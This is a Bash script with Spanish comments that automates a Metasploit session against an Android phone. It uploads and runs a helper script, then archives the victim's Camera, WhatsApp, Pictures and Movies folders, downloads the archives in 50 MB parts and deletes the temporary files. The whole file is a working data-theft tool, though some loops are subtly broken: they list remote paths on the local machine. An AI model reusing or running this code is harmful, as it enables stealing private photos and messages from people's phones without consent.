#!/bin/bash

source ./utilities/utils.sh

# Función para mostrar el uso del script
usage() {
    print_red "uso -u|--user <USERNAME>"
    exit 1
}

# Inicializar la variable USERNAME
USERNAME=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--user) USERNAME="$2"; shift ;;
        -h|--help) usage ;;
        *) usage ;;
    esac
    shift
done

# Verificar si se proporcionó un nombre de usuario
if [[ -z "$USERNAME" ]]; then
    print_cyan "Debe proporcionar un nombre de usuario con la opción -u|--user."
    usage
fi

# Directorio de destino en tu máquina
DEST_DIR="./data/$USERNAME"

print_cyan "Buscando una sesión activa..."
# Obtener el primer ID de sesión disponible
SESSION_ID=$(msfconsole -q -x  2>/dev/null "sessions -l; exit" | awk '/^\s*[0-9]+/ {print $1; exit}')

# Verificar si se encontró una sesión
if [ -z "$SESSION_ID" ]; then
    print_red "No se encontró ninguna sesión activa"
    exit 1
fi

print_cyan "Se encontró una sesión activa con el ID $SESSION_ID"
print_cyan "Creando el directorio de destino $DEST_DIR..."

# Crear el directorio de destino si no existe
mkdir -p "$DEST_DIR"

# Verificar si se pudo crear el directorio
if [ $? -ne 0 ]; then
    print_red "Error: No se pudo crear el directorio de destino"
    exit 1
fi

# Cambiar los permisos del directorio de destino
chown root:root "$DEST_DIR" 2>/dev/null
chmod 777 "$DEST_DIR" 2>/dev/null

# Generar el archivo de recursos de Metasploit
chown root:root "$DEST_DIR" 2>/dev/null
chmod 777 "$DEST_DIR" 2>/dev/null

# Generar el archivo de recursos de Metasploit
cat <<EOL > get.rc
echo "Obteniendo información del dispositivo..."
sessions -interact \$SESSION_ID --timeout 7200
echo "Cambiando al directorio /sdcard/DCIM"
cd /sdcard/DCIM
echo "Subiendo el script per.sh"
upload ./utilities/per.sh
echo "Dando permisos de ejecución al script per.sh"
chmod +x per.sh
echo "Cambiando el propietario del script per.sh a root (si es posible)"
chown root:root per.sh || true
echo "Ejecutando el script per.sh"
./per.sh
echo "Comprimiendo el directorio Camera"
tar -czvf Camera.tar.gz Camera
echo "Dividiendo el archivo Camera.tar.gz en partes de 50MB"
split -b 50M Camera.tar.gz Camera.tar.gz.part
echo "Descargando las partes del archivo Camera.tar.gz"
EOL

for part in \$(ls /sdcard/DCIM/Camera.tar.gz.part*); do
    echo "download /sdcard/DCIM/\$(basename \$part) \$DEST_DIR/\$(basename \$part)" >> get.rc
done

cat <<EOL >> get.rc
echo "Realizando limpieza de archivos temporales"
rm /sdcard/DCIM/Camera.tar.gz
rm /sdcard/DCIM/Camera.tar.gz.part*
echo "Camara descargada con éxito"
echo "Cambiando al directorio /sdcard"
cd /sdcard
echo "Comprimiendo el directorio WhatsApp"
tar -czvf WhatsApp.tar.gz WhatsApp
echo "Dividiendo el archivo WhatsApp.tar.gz en partes de 50MB"
split -b 50M WhatsApp.tar.gz WhatsApp.tar.gz.part
echo "Descargando las partes del archivo WhatsApp.tar.gz"
EOL

for part in \$(ls /sdcard/WhatsApp.tar.gz.part*); do
    echo "download /sdcard/\$(basename \$part) \$DEST_DIR/\$(basename \$part)" >> get.rc
done

cat <<EOL >> get.rc
echo "Realizando limpieza de archivos temporales"
rm /sdcard/WhatsApp.tar.gz
rm /sdcard/WhatsApp.tar.gz.part*
echo "WhatsApp descargado con éxito"
EOL

cat <<EOL >> get.rc
echo "Comprimiendo el directorio Pictures"
tar -czvf Pictures.tar.gz Pictures
echo "Dividiendo el archivo Pictures.tar.gz en partes de 50MB"
split -b 50M Pictures.tar.gz Pictures.tar.gz.part
echo "Descargando las partes del archivo Pictures.tar.gz"
EOL

for part in \$(ls /sdcard/Pictures.tar.gz.part*); do
    echo "download /sdcard/\$(basename \$part) \$DEST_DIR/\$(basename \$part)" >> get.rc
done

cat <<EOL >> get.rc
echo "Realizando limpieza de archivos temporales"
rm /sdcard/Pictures.tar.gz
rm /sdcard/Pictures.tar.gz.part*
echo "Pictures descargado con éxito"
echo "Comprimiendo el directorio Movies"
tar -czvf Movies.tar.gz Movies
echo "Dividiendo el archivo Movies.tar.gz en partes de 50MB"
split -b 50M Movies.tar.gz Movies.tar.gz.part
echo "Descargando las partes del archivo Movies.tar.gz"
EOL

for part in \$(ls /sdcard/Movies.tar.gz.part*); do
    echo "download /sdcard/\$(basename \$part) \$DEST_DIR/\$(basename \$part)" >> get.rc
done

cat <<EOL >> get.rc
echo "Realizando limpieza de archivos temporales"
rm /sdcard/Movies.tar.gz
rm /sdcard/Movies.tar.gz.part*
echo "Movies descargado con éxito"
EOL

# Ejecutar Metasploit con el archivo de recursos
resource get.rc